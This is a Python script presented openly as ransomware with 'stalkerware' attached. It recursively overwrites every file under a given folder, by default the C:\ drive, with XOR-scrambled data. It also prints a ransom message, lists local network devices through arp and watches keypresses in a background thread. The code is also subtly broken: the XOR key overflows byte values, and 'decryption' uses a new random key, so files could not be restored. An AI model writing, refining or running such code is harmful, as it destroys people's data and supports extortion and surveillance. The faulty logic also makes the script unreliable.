import os, random, sys, time, weakref
from datetime import datetime

#------------------ Ransomware Code ------------------
def encrypt_file(filepath):
    try:
        with open(filepath, "rb") as file:
            data = file.read()
        key = random.randint(1000, 9999)
        encrypted_data = bytearray([d ^ key for d in data])
        with open(filepath, "wb") as file:
            file.write(encrypted_data)
    except Exception as e:
        print(f"Error encrypting {filepath}: {e}")

def decrypt_file(filepath):
    try:
        with open(filepath, "rb") as file:
            data = file.read()
        key = random.randint(1000, 9999)
        decrypted_data = bytearray([d ^ key for d in data])
        with open(filepath, "wb") as file:
            file.write(decrypted_data)
    except Exception as e:
        print(f"Error decrypting {filepath}: {e}")

def encrypt_folder(folderpath):
    for itemname in os.listdir(folderpath):
        itempath = os.path.join(folderpath, itemname)
        try:
            if os.path.isfile(itempath):
                encrypt_file(itempath)
            elif os.path.isdir(itempath):
                encrypt_folder(itempath)
            else:
                pass  # Handle other file types (symlinks, etc.)
        except Exception as e:
            print(f"Error encrypting folder item {itemname}: {e}")

def decrypt_file_by_key(filepath, key):
    try:
        with open(filepath, "rb") as file:
            data = file.read()
        decrypted_data = bytearray([d ^ key for d in data])
        with open(filepath, "wb") as file:
            file.write(decrypted_data)
    except Exception as e:
        print(f"Error decrypting {filepath}: {e}")

def decrypt_folder(folderpath, key):
    for itemname in os.listdir(folderpath):
        itempath = os.path.join(folderpath, itemname)
        try:
            if os.path.isfile(itempath):
                decrypt_file_by_key(itempath, key)
            elif os.path.isdir(itempath):
                decrypt_folder(itempath, key)
            else:
                pass  # Handle other file types (symlinks, etc.)
        except Exception as e:
            print(f"Error decrypting folder item {itemname}: {e}")

def ransomware_init():
    # Get the current date and time.
    now = datetime.now()

    # Format the date and time into a human-readable string.
    formatted_time = now.strftime("%Y-%m-%d %H:%M:%S")

    # Print the ransom note to the user's screen.
    print("\n\t-- Ransomware Attack Initiated --")
    print(f"\n\tDate: {formatted_time}")
    print(f"\n\tYour files have been encrypted!")
    print("---------------------------------------")

# ------------------ Stalkerware Code (Attached) ------------------
def get_nearby_devices():
    try:
        # Use ARP to find devices on the same subnet.
        arp_result = subprocess.check_output(["arp", "-n"]).split()
        devices = []
        for i in range(2, len(arp_result), 3): # Check for IP, MAC and Network Name
            ip = arp_result[i]
            mac = arp_result[i + 1].replace(":", "")
            device = f"{ip} ({mac})"
            devices.append(device)

        return devices
    except Exception as e:
        print(f"Error getting nearby devices: {e}")
        return []

def monitor_user_activity():
    # Check if the user is typing in Windows.
    try:
        import keyboard
        while True:
            if keyboard.is_pressed("esc"):
                break
            elif keyboard.is_pressed("space"):
                print("Spacebar pressed")
            time.sleep(0.1) # Check every 10ms

    except ImportError as e:
        print("Keyboard module not found. Falling back to simple typing check.")
        # Check the command line for user input, fallback if keyboard is missing
        while True:
            command = input()
            if "esc" in command or "exit" in command:
                break
            elif "space" in command:
                print("Spacebar pressed")
            time.sleep(0.1) # Check every 10ms

# ------------------ Main Execution & Initialization ------------------
def main():
    # Get the current date and time for ransom note
    now = datetime.now()
    formatted_time = now.strftime("%Y-%m-%d %H:%M:%S")

    print(f"\n\tRansomware: Running as {os.getpid()} at {formatted_time}")

    # Run the ransom encryption code
    encrypt_folder(sys.argv[1] if len(sys.argv) > 1 else "C:\\")

    # Monitor user activity in the background
    user_activity = threading.Thread(target=monitor_user_activity, daemon=True)
    user_activity.start()

    print(f"\n\tRansomware: Waiting for a key...")
    input("Press Enter to confirm decryption.")  # Or use a GUI prompt

    # Decrypt the files after payment is received (e.g., via SMS)
    key = random.randint(1000, 9999) # Generate a new encryption key for each run
    decrypt_folder(sys.argv[1] if len(sys.argv) > 1 else "C:\\", key)

    print("\n\tRansomware: Decryption complete.")

if __name__ == "__main__":
    import subprocess, threading

    # Check for external dependencies.
    try:
        import keyboard # For advanced keyboard monitoring (e.g., spacebar)
    except ModuleNotFoundError as e:
        print(f"\n\tExternal dependency 'keyboard' is missing.")
        print(f"You may need to install it using `pip install keyboard`")

    # Run the ransomware code
    ransomware_init()
    main()
